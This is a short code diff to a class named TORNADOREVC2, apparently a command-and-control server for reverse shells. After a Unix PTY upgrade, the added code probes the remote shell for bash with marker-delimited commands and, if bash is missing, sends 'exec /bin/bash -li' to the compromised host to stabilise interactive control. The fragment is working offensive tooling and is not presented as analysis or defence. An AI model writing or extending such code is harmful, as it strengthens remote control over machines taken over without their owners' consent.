@@ -1620,7 +1620,24 @@ class TORNADOREVC2:
         )
         if inferred == 'unix':
             self.send_to_revshell(client_sock, term.unix_pty_upgrade_cmd())
+            time.sleep(1.5)
+            self._flush_shell(client_sock, timeout=1.0)
+            probe = (
+                "__TN_SH__; "
+                "if [ -n \"$BASH_VERSION\" ]; then echo BASH_OK; "
+                "else echo BASH_NO; fi; "
+                "echo __TN_SHEnd__"
+            )
+            self.send_to_revshell(client_sock, probe)
+            out = self.recv_output(
+                client_sock, timeout=4.0, until_marker='__TN_SHEnd__'
+            )
+            if 'BASH_NO' in out:
+                self.send_to_revshell(client_sock, "exec /bin/bash -li 2>/dev/null")
+                time.sleep(0.8)
+                self._flush_shell(client_sock, timeout=0.8)
             client_info['pty'] = True
+
         elif inferred == 'windows':
             self.send_to_revshell(
                 client_sock,
